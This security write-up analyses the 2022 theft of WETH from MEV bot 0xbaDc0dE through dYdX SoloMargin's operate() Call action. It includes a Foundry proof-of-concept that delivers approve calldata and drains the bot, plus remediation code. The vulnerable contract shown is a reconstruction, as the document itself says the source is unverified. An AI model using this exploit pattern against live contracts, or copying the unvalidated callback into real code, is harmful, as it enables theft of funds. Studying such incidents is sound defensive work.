# MEV Bot (0xbaDc0dE) — DyDx operate() Arbitrary Call Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-09 |
| **Protocol** | MEV Bot (0xbaDc0dE) |
| **Chain** | Ethereum Mainnet |
| **Loss** | All WETH (exact amount unconfirmed) |
| **Attack Tx** | [0x59ddcf5ee851d7c0b57e3fc5d625da960fe69e7d29508c5295e88f4ffe2e0e41](https://etherscan.io/tx/0x59ddcf5ee851d7c0b57e3fc5d625da960fe69e7d29508c5295e88f4ffe2e0e41) |
| **MEV Bot** | [0xbaDc0dEfAfCF6d4239BDF0b66da4D7Bd36fCF05A](https://etherscan.io/address/0xbaDc0dEfAfCF6d4239BDF0b66da4D7Bd36fCF05A) |
| **dYdX SoloMargin** | [0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e](https://etherscan.io/address/0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e) |
| **WETH** | [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2](https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) |
| **Root Cause** | Arbitrary calldata can be passed to the MEV Bot via the Call action in dYdX `operate()` |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/MEVbadc0de_exp.sol) |

---
## 1. Vulnerability Overview

The MEV Bot `0xbaDc0dE` was an automated contract performing arbitrage on Ethereum mainnet that held WETH. The dYdX SoloMargin `operate()` function can forward arbitrary calldata to any contract via the `ActionType.Call` action. The attacker exploited this to deliver an `approve(attacker, max)` calldata to the MEV Bot, then drained all of the MEV Bot's WETH via `transferFrom()`. The MEV Bot unconditionally trusted calls originating from dYdX SoloMargin and executed them without any validation.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable MEV Bot - unconditionally trusts dYdX operate() callback
contract MEVBotBadc0de {
    // ❌ When dYdX SoloMargin calls callOperation(),
    // the calldata is executed as-is without validation
    function callFunction(
        address sender,
        Account.Info memory account,
        bytes memory data
    ) external {
        // ❌ Does not verify whether msg.sender is a trusted source
        // ❌ Does not validate the contents of data
        // data = abi.encodeWithSelector(IERC20.approve.selector, attacker, type(uint256).max)
        (bool success,) = address(weth).call(data); // ❌ Executes arbitrary calldata
        require(success);
    }
}

// dYdX SoloMargin.operate() - standard behavior
// ActionType.Call → calls callFunction() on the designated contract
function operate(
    Account.Info[] memory accounts,
    Actions.ActionArgs[] memory actions
) external {
    for (uint i = 0; i < actions.length; i++) {
        if (actions[i].actionType == ActionType.Call) {
            // actions[i].otherAddress.callFunction(msg.sender, account, data)
            // ← attacker sets otherAddress = MEVBot, data = approve calldata
        }
    }
}

// ✅ Correct pattern - validate caller and data
function callFunction(
    address sender,
    Account.Info memory account,
    bytes memory data
) external {
    // ✅ Verify msg.sender is the trusted dYdX SoloMargin
    require(msg.sender == SOLO_MARGIN, "Untrusted caller");
    // ✅ Verify sender is this contract itself (only self-initiated calls allowed)
    require(sender == address(this), "Untrusted sender");
    // ✅ Restrict executable functions to a whitelist of selectors
    bytes4 selector = bytes4(data);
    require(allowedSelectors[selector], "Disallowed function");
}
```


### On-chain Original Code

Source: Unverified

> ⚠️ No on-chain source code — bytecode only or source not verified

**Vulnerable Function** — `operate()`:
```solidity
// ❌ Root cause: arbitrary calldata can be passed to the MEV Bot via the Call action in dYdX `operate()`
// Source code unverified — bytecode analysis required
// Vulnerability: arbitrary calldata can be passed to the MEV Bot via the Call action in dYdX `operate()`
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Construct ActionArgs array
    │       ├─ actionType = ActionType.Call
    │       ├─ otherAddress = MEV Bot (0xbaDc0dE)
    │       └─ data = abi.encodeWithSelector(
    │               WETH.approve.selector,
    │               attacker,
    │               type(uint256).max
    │           )
    │
    ├─[2] Call dYdX SoloMargin.operate(accounts, actions)
    │       └─ SoloMargin executes MEVBot.callFunction(attacker, account, data)
    │           └─ MEVBot call()s data on WETH → executes approve(attacker, max)
    │               ❌ No validation of calldata contents
    │
    ├─[3] WETH.approve complete
    │       └─ Attacker obtains maximum allowance over MEVBot's WETH
    │
    └─[4] WETH.transferFrom(MEVBot, attacker, MEVBot.wethBalance)
              All WETH drained from MEVBot
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// dYdX SoloMargin interface
interface DyDxPool {
    struct Info {
        address owner;
        uint256 number;
    }

    enum ActionType {
        Deposit, Withdraw, Transfer, Buy, Sell, Trade, Liquidate, Vaporize, Call
    }

    struct AssetAmount {
        bool sign;
        uint256 denomination;
        uint256 ref;
        uint256 value;
    }

    struct ActionArgs {
        ActionType actionType;
        uint256 accountId;
        AssetAmount amount;
        uint256 primaryMarketId;
        uint256 secondaryMarketId;
        address otherAddress;
        uint256 otherAccountId;
        bytes data;
    }

    function operate(Info[] calldata accounts, ActionArgs[] calldata actions) external;
    function getAccountWei(Info calldata account, uint256 marketId) external view returns (bool, uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract MEVBotExploit is Test {
    DyDxPool pool = DyDxPool(0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address mevBot = 0xbaDc0dEfAfCF6d4239BDF0b66da4D7Bd36fCF05A;

    function setUp() public {
        vm.createSelectFork("mainnet", 15_625_424);
    }

    function testExploit() public {
        address attacker = address(this);
        uint256 botWethBalance = WETH.balanceOf(mevBot);

        emit log_named_decimal_uint("[Start] MEV Bot WETH balance", botWethBalance, 18);

        // [Step 1] Deliver approve calldata to MEV Bot via ActionType.Call
        DyDxPool.ActionArgs[] memory actions = new DyDxPool.ActionArgs[](1);
        actions[0] = DyDxPool.ActionArgs({
            actionType: DyDxPool.ActionType.Call,
            accountId: 0,
            amount: DyDxPool.AssetAmount({sign: false, denomination: 0, ref: 0, value: 0}),
            primaryMarketId: 0,
            secondaryMarketId: 0,
            otherAddress: mevBot, // ← MEV Bot executes callFunction()
            otherAccountId: 0,
            // ⚡ data = WETH.approve(attacker, max) - MEV Bot executes without validation
            data: abi.encodeWithSelector(
                bytes4(keccak256("approve(address,uint256)")),
                attacker,
                type(uint256).max
            )
        });

        DyDxPool.Info[] memory infos = new DyDxPool.Info[](1);
        infos[0] = DyDxPool.Info({owner: attacker, number: 1});

        // [Step 2] Call dYdX operate() → forward calldata to MEV Bot
        pool.operate(infos, actions);

        // [Step 3] Transfer MEV Bot's WETH to the attacker
        WETH.transferFrom(mevBot, attacker, botWethBalance);

        emit log_named_decimal_uint("[End] Attacker WETH balance", WETH.balanceOf(attacker), 18);
        emit log_named_decimal_uint("[End] MEV Bot WETH balance", WETH.balanceOf(mevBot), 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary Call Execution via dYdX |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Abuse of External Protocol Trust |
| **Attack Vector** | Delivering `approve` calldata to MEV Bot via dYdX `operate()` Call action |
| **Preconditions** | MEV Bot unconditionally trusts calls from dYdX SoloMargin |
| **Impact** | All WETH drained from MEV Bot |

---
## 6. Remediation Recommendations

1. **Validate External Protocol Callbacks**: In callbacks triggered by external protocols such as `callFunction()`, verify that `msg.sender` is a trusted contract and that `sender` is the contract itself.
2. **Restrict Executable Calldata**: Manage a whitelist of function selectors that can be executed via callbacks, blocking dangerous functions such as `approve` and `transfer`.
3. **Minimize Critical Asset Storage**: Avoid holding large amounts of tokens in MEV bot contracts long-term; instead use a borrow-execute-repay pattern only when needed.

```solidity
// ✅ Safe callFunction pattern
address constant SOLO_MARGIN = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;
bytes4 constant ALLOWED_SELECTOR = bytes4(keccak256("executeArbitrage(bytes)"));

function callFunction(
    address sender,
    Account.Info memory account,
    bytes memory data
) external {
    require(msg.sender == SOLO_MARGIN, "Only dYdX");       // ✅ Validate caller
    require(sender == address(this), "Only self-initiated"); // ✅ Self-initiated only
    require(bytes4(data) == ALLOWED_SELECTOR, "Invalid fn"); // ✅ Selector whitelist
    // Arbitrage logic follows
}
```

---
## 7. Lessons Learned

- **Callback Bypass via External Protocols**: The Call action in flash loan protocols such as dYdX, AAVE, and Balancer serves as a vehicle for delivering messages to arbitrary contracts. Contracts that implement callbacks must account for these indirect call paths.
- **Risk of Asset Storage in MEV Bots**: MEV bots that hold tokens such as WETH in the contract to realize profits make those tokens a target for theft. The principle of minimizing asset storage must be observed.
- **The Danger of Implicit Trust**: Even calls originating from a reputable protocol (dYdX) can have their internal calldata controlled by an attacker. Trust must always be verified explicitly.